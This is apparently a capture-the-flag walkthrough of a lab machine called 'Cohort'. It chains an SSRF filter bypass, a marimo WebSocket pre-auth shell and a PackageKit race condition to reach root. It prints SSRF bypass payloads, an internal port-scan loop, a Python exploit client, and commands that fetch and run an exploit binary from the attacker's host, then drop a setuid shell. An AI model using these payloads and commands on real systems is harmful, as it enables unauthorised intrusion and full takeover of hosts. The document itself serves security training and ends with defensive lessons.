Cohort

Medium

Linux

Discovered SSRF in /api/validate with trivial loopback filter bypass (127.1, decimal, octal), pivoted to find internal marimo notebook via leaked vhost, exploited CVE-2026-39987 pre-auth WebSocket RCE for foothold, then escalated to root via CVE-2026-41651 PackageKit D-Bus TOCTOU race condition.

1. Recon

1.1 Nmap

Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-04 01:51 -0400
Nmap scan report for 10.129.39.150
Host is up (0.20s latency).
Not shown: 97 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

A -sV -sC follow-up scan against 22/80/443 identified nginx/1.24.0 on 80/443, an SSH banner on 22, and a TLS certificate for cohort.htb with a wildcard SAN (*.cohort.htb) — a strong hint that other vhosts exist on the box, even though nmap only exposed three ports.

Added the host to resolution:

curl -s -k --resolve cohort.htb:443:10.129.39.150 https://cohort.htb/

1.2 Web recon

https://cohort.htb/ is a client-side rendered SPA ("Cohort Analytics") — a heavily obfuscated assets/app.js bundle serves the UI. Rather than reverse-engineering the obfuscation statically, the app was driven with a real headless Chromium on the attacking Kali box (the only host with VPN access to the HTB network — Playwright/browser tooling on the local Windows machine could not reach the target):

chromium --headless=new --no-sandbox --remote-debugging-port=9222 \
  --host-resolver-rules="MAP cohort.htb 10.129.39.150" --ignore-certificate-errors about:blank &

Then connected with puppeteer-core over CDP (http://127.0.0.1:9222) and captured the actual network requests. This revealed a second page:

/portal.html   →  "Client Insights" — Register a report source URL

The portal lets a user submit a URL; the backend claims to fetch and validate it, explicitly stating that internal/loopback addresses are rejected. Submitting the form triggers:

POST /api/validate
Content-Type: application/json
{"url": "<user-supplied>", "format": "csv"}

This is a server-side URL fetcher — a classic SSRF candidate.

2. SSRF (/api/validate)

2.1 Confirming the vulnerability

curl -s -k -X POST --resolve cohort.htb:443:10.129.39.150 \
  https://cohort.htb/api/validate -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1/","format":"csv"}'
# {"ok": false, "message": "Internal or loopback addresses are not permitted."}

The filter does a naive substring/exact-match check on 127.0.0.1 / localhost. It was trivially bypassed:

Payload Result
http://127.1/ ✅ bypass
http://0.0.0.0/ ✅ bypass
http://2130706433/ (decimal) ✅ bypass
http://0177.0.0.1/ (octal) ✅ bypass
http://0/ ✅ bypass

file://, gopher:// and other schemes were explicitly rejected ("Only http and https sources are supported."), so the SSRF is restricted to blind HTTP(S) GET — no local file read.

2.2 Internal port scan via SSRF

Using the 127.1 bypass, common ports were probed one at a time (response content/timing distinguishes open vs closed/filtered):

for p in 22 80 443 3000 5000 5432 6379 8000 8080 8443 8888 9000 27017; do
  curl -s -k -X POST --resolve cohort.htb:443:10.129.39.150 \
    https://cohort.htb/api/validate -H "Content-Type: application/json" \
    -d "{\"url\":\"http://127.1:$p/\",\"format\":\"csv\"}" -m 6
done

Findings:

Port Service
5000 The Flask/Starlette backend itself (proxied publicly as /api/*)
8888 A marimo notebook server — login page, internal-only

2.3 Bypassing an nginx localhost-only ACL

Directory fuzzing on the public site had turned up /status returning 403 Forbidden — consistent with an nginx stub_status-style location restricted by allow 127.0.0.1; deny all;.

Because the SSRF makes the server itself the requester, fetching /status through it satisfies the 127.0.0.1 ACL:

curl -s -k -X POST --resolve cohort.htb:443:10.129.39.150 \
  https://cohort.htb/api/validate -H "Content-Type: application/json" \
  -d '{"url":"http://127.1/status","format":"json"}'

This leaked the real (otherwise unguessable) vhost nginx uses to reverse-proxy to the marimo notebook:

nb-1be3782a8afd3ad5.cohort.htb  →  proxies to 127.0.0.1:8888

Confirmed directly:

curl -s -k --resolve nb-1be3782a8afd3ad5.cohort.htb:443:10.129.39.150 \
  https://nb-1be3782a8afd3ad5.cohort.htb/
# HTTP/1.1 303 See Other
# location: https://nb-1be3782a8afd3ad5.cohort.htb/auth/login?next=...

nmap -Pn -p8888 10.129.39.150 confirmed the port itself is closed externally (conn-refused) — marimo is genuinely loopback-bound; this discovered vhost is the only public path to it.

3. Foothold — CVE-2026-39987 (marimo pre-auth RCE)

marimo (an interactive Python notebook server, version 0.20.4 per pip list in its venv) ships a /terminal/ws WebSocket endpoint that spawns an OS pty. CVE-2026-39987 is a pre-auth bypass: validate_auth() is not enforced on this route, so any client that completes the WebSocket handshake gets an unauthenticated interactive shell as the user running marimo.

3.1 Tooling constraints

  • Playwright (browser automation) was only available on the analyst's local Windows machine, which has no route to the HTB VPN — only the Kali box does.
  • Python's websocket-client library was available on Kali, but its recv()/timeout handling misbehaved badly over the TLS socket (calls blocked indefinitely regardless of settimeout()), making an interactive exchange impractical.

Solution: hand-rolled a minimal WebSocket client directly on raw TLS sockets (handshake + RFC 6455 frame parsing), giving full, reliable control over the connection. DNS for the discovered vhost was faked via a socket.getaddrinfo monkey-patch (no root available to edit /etc/hosts), and select() was used for real timeout control on frame reads.

3.2 Exploit

import socket, ssl, base64, os, struct, time, select

TARGET_IP = "10.129.39.150"
HOST = "nb-1be3782a8afd3ad5.cohort.htb"
PATH = "/terminal/ws"

def connect():
    raw = socket.create_connection((TARGET_IP, 443), timeout=5)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = ctx.wrap_socket(raw, server_hostname=HOST)
    key = base64.b64encode(os.urandom(16)).decode()
    req = (f"GET {PATH} HTTP/1.1\r\nHost: {HOST}\r\nUpgrade: websocket\r\n"
           f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\n"
           f"Sec-WebSocket-Version: 13\r\nOrigin: https://{HOST}\r\n\r\n")
    s.sendall(req.encode())
    s.settimeout(5)
    resp = b""
    while b"\r\n\r\n" not in resp:
        resp += s.recv(4096)
    return s

# ... send_text() / recv_frames() implement RFC 6455 framing (mask on send,
# unmask not required on recv since the server doesn't mask its frames) ...

s = connect()
recv_frames(s, 3)                       # drain the pty banner / prompt
send_text(s, "id; whoami; hostname\r")  # \r submits the line to the shell
print(recv_frames(s, 4).decode())

4. Privilege Escalation — CVE-2026-41651 "Pack2TheRoot" (PackageKit)

4.1 Enumeration

Standard checks (SUID/SGID, sudo -l, cron/timers, capabilities, systemd units, cloud-init leftovers, world-writable paths, laurel/auditd config) turned up nothing directly exploitable — the box was deliberately hardened (NoNewPrivileges, restricted userns/ptrace sysctls, etc.). Two other local, unprivileged service accounts (insights running the SSRF backend, _laurel running the audit log processor) were identified but yielded no lateral path.

The relevant lead came from checking installed system components rather than the app stack itself:

cat /etc/os-release
dpkg-query -W -f='${Version}\n' packagekit
command -v dbus-send
command -v dpkg-deb

The box runs an outdated PackageKit with D-Bus and dpkg-deb present — the exact preconditions for CVE-2026-41651, a local root exploit nicknamed Pack2TheRoot.

4.2 The vulnerability

CVE-2026-41651 is a TOCTOU (time-of-check/time-of-use) race condition in PackageKit's D-Bus transaction handling:

  1. Open a PackageKit transaction over D-Bus.
  2. Call InstallFiles once with the SIMULATE flag set (a dry run).
  3. Before the daemon finishes processing that simulated request, immediately send a second InstallFiles call on the same transaction — this time for a real install, pointing at an attacker-controlled .deb path.
  4. The daemon's later execution phase ends up reading the overwritten path/parameters from the race.
  5. PackageKit installs the attacker's .deb, running its postinst maintainer script as root.

4.3 Exploitation

Using the public PoC (shibaaa204/Pack2TheRoot), compiled as exploit.bin, transferred to the target the same way as the marimo foothold's SSH-less environment required earlier (own HTTP server on the Kali box, curl pull from the target, since the target has outbound VPN connectivity back to the attacking host):

# on Kali
python -m http.server 8000 --bind 10.10.16.186
# on target, as marimo (via the /terminal/ws shell)
curl -O http://10.10.16.186:8000/exploit.bin
chmod +x exploit.bin

rm -f /tmp/.suid_bash /tmp/pk.log
nohup /tmp/exploit.bin >/tmp/pk.log 2>&1 &
sleep 12

ls -l /tmp/.suid_bash
cat /tmp/pk.log

The exploit races the D-Bus transaction as described above and drops a setuid-root copy of bash at /tmp/.suid_bash once it wins the race.

4.4 Root

/tmp/.suid_bash -p -c 'id; cat /root/root.txt'

-p tells bash to not drop the effective UID granted by the setuid bit, so the shell retains euid=0.

uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
<root flag>

6. Key Takeaways

  • SSRF filters that pattern-match strings instead of resolving/normalizing IPs are trivially bypassed (alternate loopback representations, decimal/octal encoding).
  • SSRF is a pivot, not just a leak — here it was used both for internal port discovery and to bypass an IP-based ACL on an nginx-internal endpoint (/status), which is what actually revealed the path to the vulnerable service.
  • Pre-auth WebSocket routes need the same auth middleware as HTTP routes — CVE-2026-39987 existed because /terminal/ws simply didn't call validate_auth().
  • Outdated system services (PackageKit) are as dangerous as outdated app-layer software — the final privesc had nothing to do with the custom "Cohort Analytics" application at all.
